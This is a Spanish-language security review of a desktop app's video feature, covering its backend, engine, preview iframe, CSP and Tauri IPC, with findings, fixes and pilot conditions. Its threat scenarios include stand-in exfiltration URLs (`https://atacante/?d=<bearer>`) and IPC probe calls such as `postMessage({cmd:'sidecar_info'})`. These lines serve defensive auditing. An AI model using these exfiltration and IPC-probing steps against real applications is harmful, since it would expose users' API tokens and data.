# R2 · Fase 1 de vídeo: revisión de seguridad de punta a punta (SEO-107)

Rama `feat/21-aceptacion` (= `feat/video-fase1-integrada` + pruebas de T21), revisión en solo lectura, 2026-11-11.
Referencias: `SPEC-video.md` §Seguridad (A1–A4, I1–I15, «Pruebas negativas mínimas», «Enmiendas de la fase 1»),
`docs/video-fase1/R0-fase1.md`, `docs/video-fase1/integracion-fase1-completa.md` («Hallazgos abiertos heredados») y las
revisiones por paquete `seguridad-T*.md`, que no se repiten aquí.

## Alcance

Las fronteras **compuestas** tras integrar, no cada paquete por separado:

1. **UI → backend → motor → composición.** Datos del usuario y salida del modelo (entrada no confiable) desde el
   WebView, por las rutas `/video/*` (`app-backend/app_backend/video_rest.py`), al motor por MCP/stdio
   (`app-backend/app_backend/video.py`, `video-mcp-server/src/index.ts`, `herramientas-proyecto.ts`), hasta el HTML de
   composición (`video-mcp-server/src/composicion.ts`, `plantilla/`) y los hijos (Chrome, ffmpeg, HyperFrames:
   `src/proceso.ts`, `patches/hyperframes+0.8.206.patch`). Comandos Rust (`app-ui/src-tauri/src/lib.rs`), CSP y
   capacidades de Tauri (`tauri.conf.json`, `capabilities/`), clave de ElevenLabs.
2. **Preview → padre.** Servidor de preview (`app-backend/app_backend/preview.py`, puertos 47810–47813), iframe
   (`app-ui/src/video/Preview.tsx`), protocolo `postMessage` (`previewProtocolo.ts`), `frame-src`/`frame-ancestors`,
   red cerrada y qué puede hacer una composición hostil contra el WebView o el backend.
3. Condiciones de seguridad para el piloto con `VIDEO_ENGINE=1`.

Fuera de alcance: el bug conocido `content_overlap` con `cartel`/`cifra` como primera escena (no es de seguridad,
ya reportado en `T21-aceptacion-motor.md`).

## Método

- Traza de cada dato de punta a punta en el código: guion y proyecto (UI → `leer_cuerpo` → tool del motor con
  esquema `.strict()` → `planificarComposicion` → `pieza()`/`escaparHtml`/`jsonParaScript`), bandeja de recursos
  (diálogo Rust → `<estado>/…/bandeja/<32hex>.bin` → `reclamarBandeja` del motor), MP4 exportado, clave de ElevenLabs
  (almacén → `entorno_motor` → `process.env` del motor → `entornoHijo()` y `log.ts`), URL de la preview (backend →
  `aPreviewUrl` → `iframe src`) y mensajes del iframe (`CONTROL_JS` → `validarMensajeIframe`).
- Revisión de cada sumidero de las plantillas (`{{…}}` en `piezas/*.html` e `index.html`) y búsqueda de `innerHTML`,
  `eval`, `new Function` y asignaciones de `src`.
- Comprobación de que los cierres prometidos por R0 existen en el código y tienen test (`render_sin_puerto_cdp`,
  `servidor_hf_solo_render`, `barrido_al_arrancar`, `frame_ancestors_produccion`, `meta_csp_unica`).
- Ejecución: `uv run pytest -q tests/test_preview.py` → **115 passed, 2 skipped**. Comprobación de la ruta de la bandeja
  con `node -e` (`path.join(path.dirname(path.resolve('C:/s/video/proyectos')),'video','bandeja')` → `C:\s\video\video\bandeja`).
- No se ha ejecutado ningún render, E2E ni la suite completa.

## Hallazgos por severidad

Recuento: **Critical 0 · High 0 · Medium 2 · Low 2 · Info 3.**

### R2-1 · Medium · La bandeja de Rust y la del motor son carpetas distintas: los recursos no se importan y las copias del usuario se quedan para siempre

**Dónde:**
- `app-ui/src-tauri/src/lib.rs:480` — `dir_estado().join("video").join("bandeja")` → `<estado>\video\bandeja\`.
- `app-backend/app_backend/config.py:123` — `VIDEO_ROOT = STATE_DIR / "video" / "proyectos"`, que `video.py:512` pasa al motor.
- `video-mcp-server/src/recursos.ts:48` — `carpetaBandeja = path.join(path.dirname(VIDEO_ROOT), "video", "bandeja")`
  → `<estado>\video\video\bandeja\` (lo mismo `carpetaMusica`, `:50`).
- `app-backend/tests/test_video_t11.py:1153` usa la convención del motor (`raiz.parent / "video" / "bandeja"`) y los
  tests de Rust (`lib.rs:698`) la suya, así que ninguna prueba cruza las dos.

**Escenario:** en la app instalada el usuario importa una foto o un clip. El comando nativo copia el fichero a
`<estado>\video\bandeja\<id>.bin` y devuelve el id; el backend lo reenvía (`video_rest.py:1050`) y el motor lo busca en
`<estado>\video\video\bandeja\` → `no_encontrado`. Consecuencias de seguridad, además de la funcional:
(a) **retención de datos**: ninguna pieza del sistema barre la bandeja (no hay limpieza ni en Rust, ni en el backend, ni
en el motor), así que cada intento deja una copia íntegra de la foto o el clip privado (hasta 500 MB) en
`%LOCALAPPDATA%`, fuera de cualquier proyecto, y borrar el proyecto no la elimina; (b) la promesa de I6 («id opaco de un
solo uso») no se cumple en la práctica: el id nunca se consume; (c) riesgo de un «arreglo» apresurado que relaje la
validación de rutas (p. ej. que el motor busque en varias carpetas o acepte una ruta del backend).
Los E2E no lo ven porque simulan el `invoke` de Rust.

**Arreglo propuesto:** una sola fuente de la ruta. Lo más robusto es que el backend pase al motor la carpeta de la
bandeja y de la música por el entorno (`VIDEO_BANDEJA_DIR`, calculada desde `STATE_DIR`, como ya hace con
`VIDEO_STATE_DIR`) y que Rust use la misma fórmula, con un test de contrato que compare las tres (Rust, `config.py` y el
motor). Revisar a la vez la convención `dirname(VIDEO_ROOT)/video/…` de guiones, perfiles y muestras (T8 L4, T5 c), que
deja todo bajo `video\video\`. Añadir un barrido de entradas de la bandeja con más de N horas (al arrancar el motor) y
borrar las que no se reclamen. No relajar `BANDEJA_RE` ni `sinEnlace` al arreglarlo.

### R2-2 · Medium · El aviso `puertos_preview_ajenos` (mitigación de R0-7) se pinta como «undefined»

**Dónde:**
- `app-backend/app_backend/video_rest.py:861-868` — los avisos de `POST …/preview` salen como `{"codigo": …}` y
  `{"codigo": "puertos_preview_ajenos", "puertos": […]}`, **sin `mensaje`**.
- `app-ui/src/video/Preview.tsx:256-258` — `avisos.map((a) => sinRutas(String(a.mensaje)))`.
- `app-ui/src/api/types.ts:253-257` declara `mensaje: string` y `app-ui/src/test/preview.test.tsx:107-111` prueba con un
  aviso que sí trae `mensaje`: el test valida un contrato que el backend no cumple.
- La tabla de textos que traduce `puertos_preview_ajenos` existe, pero solo para el resultado del render
  (`app-ui/src/video/render/resultado.ts:10`).

**Escenario (A4):** otro usuario de Windows ocupa `127.0.0.1:47811` antes de que arranque la app. El backend lo detecta y
lo avisa (I8: «un puerto de la lista ocupado por otro proceso se avisa, porque la composición podría navegar a él»), pero
el editor muestra «undefined». El usuario no sabe que la preview tiene un sumidero ajeno al alcance de `frame-src`; si
algún día falla un escape de I1, la composición navega su marco a `http://127.0.0.1:47811/?d=<datos>`. El control que
R0-7 dejó como única mitigación es invisible (I11: «si algo falla, el fallo se ve»). Lo mismo pasa con los avisos del
motor (fondo sustituido), que tampoco llevan texto.

**Arreglo propuesto:** el UI traduce `codigo` con una tabla cerrada compartida (la de `resultado.ts`, extraída) y nunca
pinta `String(undefined)`: aviso sin texto conocido → frase genérica que cite el código. Cambiar el test para que use la
forma real de la respuesta (`{codigo, puertos}`) y añadir un E2E o test de contrato que monte la respuesta del backend
de verdad. No reintroducir texto libre del motor en el aviso.

### R2-3 · Low · Ningún test demuestra que el iframe de la preview no alcanza el IPC de Tauri

**Dónde:** `app-ui/src-tauri/capabilities/*.json` (solo `core:default`, sin `remote`), `lib.rs:603-613` (nueve comandos de
la app), `preview.py:cabecera_csp` (`connect-src` solo el origen de la preview). No hay ninguna prueba en `app-ui/e2e`,
`app-ui/src/test` ni `app-backend/tests` que mire `__TAURI_INTERNALS__`, `window.chrome.webview` o `ipc.localhost` desde
dentro del iframe.

**Escenario (compuesto, condicionado a un fallo de I1):** si un escape de la composición fallase y el documento del
iframe tuviera acceso al IPC, podría invocar `sidecar_info` (devuelve el bearer de la API) y `abrir_url`
(`https://atacante/?d=<bearer o textos>`, que abre el navegador del sistema: exfiltración fuera de toda CSP). Hoy lo
impiden, por diseño, tres capas que no se han medido en la app real: la CSP de la preview (`connect-src` no admite
`ipc:` ni `http://ipc.localhost`), la comprobación de origen del IPC de Tauri 2.12 (el iframe tiene origen opaco y la
capacidad no declara `remote`) y que WebView2 entregue `chrome.webview.postMessage` de un subframe a
`CoreWebView2Frame`, no al manejador de la ventana. Es probable que se cumpla, pero no está verificado.

**Arreglo propuesto:** prueba manual de Marc en la app instalada (ver condiciones) y, cuando haya E2E con Tauri real,
un test `iframe_sin_ipc` que cargue una composición de prueba que intente `window.__TAURI_INTERNALS__`,
`window.chrome?.webview?.postMessage(...)` y `fetch("http://ipc.localhost/…")` y compruebe que ninguna orden llega.

### R2-4 · Low · WebRTC sigue abierto en la preview (empeora el heredado T12 Medium en la frontera compuesta)

**Dónde:** `tauri.conf.json:20` (`additionalBrowserArgs` solo con `--force-webrtc-ip-handling-policy=disable_non_proxied_udp`),
`preview.py` `CONTROL_JS` (no retira `RTCPeerConnection` ni `RTCDataChannel`, a diferencia de lo que sugería R0-11).

**Escenario:** es el heredado T12 (no es nuevo), pero en la frontera compuesta la preview es el punto más débil de I2: el
render tiene proxy nulo y resolutor cerrado, la preview en WebView2 no tiene ninguno de los dos. La CSP no gobierna
WebRTC, y `disable_non_proxied_udp` sin proxy deja salir TCP hacia un TURN. Si fallase I1, la composición tendría un
canal de salida a Internet sin pasar por ninguna barrera. Se clasifica Low aquí porque requiere un fallo previo de I1
(el escape revisado en `composicion.ts` es correcto: texto por `escaparHtml`, datos por `jsonParaScript`, colores por
`COLOR_RE`, fuentes de lista cerrada, sin `innerHTML` ni `eval` en las plantillas) y el riesgo ya está abierto como
Medium en T12.

**Arreglo propuesto:** decidir el riesgo residual antes del piloto. Opción barata y sin dependencias: añadir a
`additionalBrowserArgs` el `--disable-features=WebRtc…` que corresponda (medirlo en WebView2) y, como defensa en
profundidad, que `CONTROL_JS` borre `RTCPeerConnection`, `webkitRTCPeerConnection` y `RTCDataChannel` del `window` antes
de que corra la composición (no es una barrera: un fallo de I1 puede reaparecer los constructores desde un iframe, que la
CSP `frame-src 'none'` ya impide).

### R2-5 · Info · La API admite `http://localhost:1420` como origen CORS también en producción

`app-backend/app_backend/main.py:53`. R0-9 se cerró para `frame-ancestors` de la preview (`preview.py:cabecera_csp`,
solo si `not FROZEN`), pero no para el CORS de la API. Un proceso ajeno (A4) en `localhost:1420` podría hacer peticiones
con CORS permitido; sin el bearer no obtiene nada. Propuesta: el mismo `if not config.FROZEN`.

### R2-6 · Info · `tauri.localhost` es alcanzable desde el navegador del usuario

Chromium resuelve `*.localhost` a loopback: un proceso de otro usuario (A4) en `127.0.0.1:80` serviría una página con
origen `http://tauri.localhost`, aceptado por el CORS de la API y por `frame-ancestors` de la preview. Sigue haciendo
falta el bearer o la clave de 32 bytes, así que no hay impacto; se anota para que nadie use el origen como autenticación.

### R2-7 · Info · Tools heredadas registradas en el modo integrado sin uso del backend

`video-mcp-server/src/index.ts:102-180`: `video_renderizar`, `video_fotograma`, `video_vista_previa`, `video_ayuda` y
`video_capacidades` se registran también con `VIDEO_ENGINE_EMBEDDED=1`. Solo aceptan `id` y números acotados, el modelo
no las ve (D2: `registry.py` no tiene tools `video_*`) y el backend llama a tools por nombre fijo, así que no amplían la
superficie explotable. Conviene registrarlas solo si el backend las usa, para que la lista de tools del modo integrado
coincida con la de las rutas.

## Fronteras compuestas sin hallazgos (verificadas)

- **UI → backend → motor.** Rutas con patrón (`video_rest.py:41-50`), id de la ruta igual al del cuerpo, tope de
  1 MiB contando el flujo real, profundidad 16, errores con mensajes fijos y sin rutas (`_http`, `_problemas_seguros`),
  resultados del motor filtrados campo a campo (`recurso_seguro`, `_pista_segura`, `_resultado_render`: nunca la ruta
  del MP4; los listados, guardados y avisos de guiones, proyectos y perfiles, desde A27-5 en `auditoria-PR27.md`). El modelo no tiene tools `video_*`; renders y voz solo desde la UI (D2, I10).
- **Composición.** Todo `{{…}}` de `plantilla/` se rellena en una pasada; texto por `escaparHtml`, JSON en `<script>`
  por `jsonParaScript` (con `<`, `>`, `&`, U+2028/2029 escapados y números no finitos rechazados), colores por
  `COLOR_RE`, fuentes de lista cerrada, `validarTema` al planificar y `hallazgosDeRed` antes de escribir. Sin
  `innerHTML`, `eval` ni `new Function` en las piezas (el `new Function` de `shaders.iife.js` está justificado en
  `index.html:20` y lo bloquea la CSP).
- **Procesos y entorno (I5, I7, I13).** Un solo `spawn` en el motor (`proceso.ts:490`), sin shell, entorno construido
  desde cero (`entornoHijo`, `proceso.ts:145`) y pisado después de cualquier `env` de las opciones. El canal de render se
  lanza sin la clave (`entorno_motor(con_clave=False)`); los logs del motor (`log.ts:29`) y el stderr reenviado
  (`video.py:144`) la ocultan. El parche rechaza `--remote-debugging-*` salvo el pipe (R0-1 cerrado en código, test
  `render_sin_puerto_cdp`); sockets en escucha medidos en `render-real.test.ts`/`sandbox-render.test.ts`.
- **ElevenLabs.** `VIDEO_PRUEBAS_TTS_URL` solo con `VIDEO_E2E=1` o en desarrollo y solo `http://127.0.0.1:<puerto>`
  (`tts.ts:14-27`); el backend congelado no la pasa (`video.py:543-550`). `redirect: "error"` en las llamadas.
- **Exportar MP4.** `exportar_mp4` valida el id, abre el origen una vez sin seguir reanálisis, comprueba enlaces duros y
  tamaño sobre el handle, y crea el destino con `create_new` (no pisa ni sigue un enlace existente).
- **Preview.** Puerto propio y API en otro (`vincular_api` evita la lista), `despachar` por puerto, comprobación de
  `Host` contra DNS rebinding, clave de 32 bytes atada a `(id, carpeta, creado)` con comparación en tiempo constante,
  rotación en cada apertura e invalidación al cerrar, borrar y reiniciar; sin log de acceso; resolución sin seguir
  enlaces y dentro de `_composicion/r<n>`; CSP con `sandbox allow-scripts`, `connect-src` solo su origen,
  `frame-ancestors` sin `localhost:1420` en producción, `nosniff`, `no-store`, `no-referrer`; runtime servido desde
  memoria tras comprobar su SHA-256; `<meta>` CSP sustituido exactamente una vez. `CORS: null` solo para documentos
  opacos que ya tienen la clave.
- **Preview → padre.** `sandbox="allow-scripts"` exacto, `src` solo desde `aPreviewUrl` (host `127.0.0.1`, puertos de
  la lista, sin normalización), `frame-src` exacto de los cuatro puertos en `csp` y `devCsp` (cerrado el `127.0.0.1:*`
  de R0-13). Mensajes aceptados solo con `e.source === contentWindow` y `e.origin === "null"`, objeto plano, claves
  exactas, `id` correlacionado, números finitos en rango y limitador de 120/s; se pintan como texto. Hacia dentro, solo a
  `contentWindow` y sin datos sensibles. Una composición hostil no alcanza la API (otro puerto, fuera de `frame-src` y
  `connect-src`, y con bearer), no abre ventanas ni navega el padre, y solo puede navegar su marco a los cuatro puertos de
  la lista (ver R2-2 y el heredado R0-7).

## Estado de los heredados

| Heredado | Estado | Comprobación |
|---|---|---|
| T12 Medium · `disable_non_proxied_udp` no cierra WebRTC | **Abierto; más relevante en la frontera compuesta** (R2-4) | `tauri.conf.json:20` sin cambios; `CONTROL_JS` no retira WebRTC |
| T12 Low · carrera del mutex con el relanzamiento del updater | Abierto (prueba manual) | `lib.rs` `adquirir`/`arrancar_con_instancia_unica` sin cambios |
| T13 M1 · se rechaza todo `REPARSE_POINT` (OneDrive) | Abierto; falla cerrado | `lib.rs` `abrir_regular` rechaza `FILE_ATTRIBUTE_REPARSE_POINT` |
| T13 L2 · MP4 truncado con el nombre final si el proceso muere | Abierto | `copiar_a_destino_nuevo` escribe en el destino final; solo borra si falla en vida |
| T13 L3 · `blocking_*` en comandos `async`, sin cerrojo de un diálogo a la vez | Abierto | `importar_recurso`, `exportar_mp4`, `elegir_*` sin mutex |
| T17 Info 7–9 · tests de `postMessage` poco estrictos | Abierto, y se suma R2-2: el test de avisos valida un contrato falso | `preview.test.tsx:107-111` |
| Manual de Marc (T12) · WebRTC en WebView2 y sonda de red | Pendiente | — |
| R0-1 High (cond.) · puerto CDP | **Cerrado en código** | parche `:125-129`, test `render_sin_puerto_cdp` |
| R0-2 Medium · servidor de ficheros de HyperFrames | Riesgo residual aceptado; test `servidor_hf_solo_render` | sin prefijo aleatorio todavía |
| R0-6 Medium · barrido al arrancar | Cerrado | `index.ts` `barridoAlArrancar`, `barrido-arranque.test.ts` |
| R0-7 Medium · puertos fijos | Reserva exclusiva hecha (`preview.py:_vincular`); **el aviso no se ve** (R2-2) | — |
| R0-9 Low · `frame-ancestors` con `localhost:1420` | Cerrado en la preview; queda en el CORS de la API (R2-5) | — |
| R0-10 Low · runtime y `<meta>` | Cerrado | `Runtime`, `reescribir_html` |

## Condiciones para `VIDEO_ENGINE=1`

`VIDEO_ENGINE=1` es la variable de Actions que mete el motor en el instalador (`app-ui/README.md:121-150`). Antes de
activarla para el piloto local, además de las del plan (T0 aprobada, W3.x integradas, M-4 cerrada, M-5 medida, M2
hecha, obligaciones LGPL de `LICENCIAS.md`):

1. **R2-1 arreglado y probado con Rust real:** importar una foto, un clip y una pista desde la app instalada; la
   bandeja queda vacía tras cada importación y tras borrar el proyecto. Con la ruta partida, el piloto no puede
   importar recursos y acumula copias privadas.
2. **R2-2 arreglado:** el aviso `puertos_preview_ajenos` se ve con texto legible (prueba: ocupar 47811 con otro proceso
   antes de abrir la app).
3. **Prueba manual de IPC desde el iframe (R2-3)** en la app instalada: con DevTools del WebView2 en el contexto del
   iframe, `window.__TAURI_INTERNALS__` es `undefined`, `window.chrome?.webview?.postMessage({cmd:"sidecar_info"})` no
   produce respuesta ni efecto, y `fetch("http://ipc.localhost/…")` lo bloquea la CSP.
4. **Decisión escrita sobre WebRTC en la preview (T12 / R2-4):** cerrarlo con `--disable-features` medido en WebView2,
   o aceptarlo como residual en `SPEC-video.md` («Riesgos residuales aceptados») con su justificación. Hoy la spec no
   lo recoge como aceptado.
5. **Sonda de red con la app real (manual T12):** una composición de prueba con `fetch`, `<img src=//…>`, WebSocket y
   `RTCPeerConnection` en la preview y en el render; cero conexiones fuera de loopback (salvo lo que el punto 4 acepte).
6. **Navegador descargado y verificado por el camino del producto** (`POST /video/navegador/descarga`), con el
   manifiesto anclado; el renderer en Untrusted durante el render en la app instalada (I3), medido por el test con la
   condición de R0-12 (todos en Untrusted en la primera captura).
7. **Clave de ElevenLabs solo en el almacén** (no en `.env` ni en el entorno del usuario): el respaldo
   `os.environ.get("ELEVENLABS_API_KEY")` de `config.py:151` se hereda del entorno de Tauri en el sidecar; para el
   piloto, comprobar que la variable no existe en el entorno de la sesión.
8. **Una sola instancia y sin `tauri dev` en paralelo:** el piloto con la app instalada, sin otra instancia ni un
   `pnpm dev` que ocupe 1420 o los puertos de preview.
9. **Repetir la tabla de pruebas negativas** sobre el bundle del piloto (no solo sobre el árbol de desarrollo),
   incluidas «sockets en escucha en `127.0.0.1`», «render con timeout sin procesos bajo el CfT o el ffmpeg» y «clave
   ausente» (CA7 de T21), y anotar el resultado en el informe del piloto.

## Veredicto

**Aprobada con cambios para integrar; el piloto con `VIDEO_ENGINE=1` queda condicionado.** No hay Critical ni High: las
fronteras compuestas UI → backend → motor → composición y preview → padre están bien cerradas en el código revisado
(escape por contexto, entorno por lista blanca, clave fuera del canal de render y de los logs, CDP rechazado, preview en
origen propio con clave de capacidad y CSP de cabecera, `postMessage` validado por esquema). Los dos Medium son fallos de
**integración entre componentes** que los tests por paquete no podían ver: la ruta de la bandeja partida entre Rust y el
motor (R2-1), que además retiene copias privadas del usuario, y el aviso de puertos ajenos invisible (R2-2). Ambos se
arreglan antes del piloto, junto con la prueba manual de IPC desde el iframe (R2-3) y la decisión sobre WebRTC en la
preview (R2-4 / T12).
